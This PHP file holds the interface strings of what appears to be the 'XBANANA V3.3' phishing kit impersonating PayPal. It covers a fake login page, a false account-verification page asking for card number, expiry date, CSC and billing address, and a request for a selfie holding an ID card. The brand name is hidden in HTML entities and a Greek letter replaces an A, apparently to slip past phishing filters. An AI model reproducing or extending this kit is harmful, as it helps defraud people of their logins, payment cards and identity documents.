<?php
                                                

session_start();
error_reporting(0); 
/////////// XBANANA V3.3 INDEX LOGIN ///////////////////////////////////////////
$xBanana_01 = "Log in to your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Account";
$xBanana_02 = "Email";
$xBanana_03 = "Password";
$xBanana_04 = "Email address is required.";
$xBanana_05 = "Password is required.";
$xBanana_06 = "Log In";
$xBanana_07 = "Having trouble logging in?";
$xBanana_08 = "Sign Up";
$xBanana_09 = "Privacy";
$xBanana_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$xBanana_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$xBanana_12 = "Checking your info…";
$xBanana_13 = "Some of your info isn't correct. Please try again.";
/////////// XBANANA V3.3 INDEX/BILLING/CARDING/SUCCESS //////////////////////////////////////////
$xBanana_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security";
$xBanana_securityLock  = "Your security is our top priority";
$xBanana_verify        = "Verify your account";
$xBanana_pargraphe     = "Dear customer, please enter your account information correctly and match with your card information.";
$xBanana_update_card   = "Update Card Information";
$xBanana_cardholder    = "Cardholder Name";
$xBanana_cardnumber    = "Card Number";
$xBanana_expdate       = "Expiration Date";
$xBanana_csc           = "CSC (3 digits)";
$xBanana_update_bill   = "Update Billing Address";
$xBanana_fullname      = "Legal Full Name";
$xBanana_address       = "Address Line";
$xBanana_city          = "City";
$xBanana_state         = "State";
$xBanana_zipCode       = "Postal Code";
$xBanana_mobile        = "Mobile";
$xBanana_home          = "Home";
$xBanana_phoneNumber   = "Phone Number";
$xBanana_agree         = "By clicking Agree & Continue, I have read and agree to &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s ";
$xBanana_user_agrement = "User Agreement";
$xBanana_privacy       = "Privacy Policy";
$xBanana_and           = " and ";
$xBanana_policy        = "Electronic Communications Delivery Policy";
$xBanana_submit        = "Αgree & Continue";
$xBanana_fPrivacy      = "Privacy";
$xBanana_flegal        = "Legal";
$xBanana_fHelpCenter   = "Help Center";
$xBanana_success       = "Congratulations !";
$xBanana_successp      = "Dear ".$_SESSION['_fullname_'].", your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; account has been successfully verified. You will be redirected automatically to login page in 5 seconds.";
$xBanana_billing       = "Billing Address Information";
$xBanana_carding       = " Card Information";
/////////// XBANANA V3.3 INDEX CONFIRM IDENTITY ////////////////////////////////////////// 
$xBanana_id_title      = "Confirm your identity";
$xBanana_id_parag      = "Your identification documents will help us to validate your identity.";
$xBanana_id_ask        = "What i should to do, to confirm my identity?";
$xBanana_id_li_1       = "Take a selfie by holding your ID Card also your ";
$xBanana_id_li_2       = "Cardholder Name and ID Card should match and be clearly visible.";
$xBanana_id_li_3       = "Your identification document must be next to your face.";
$xBanana_id_example    = "Here's an example for picture :";
?>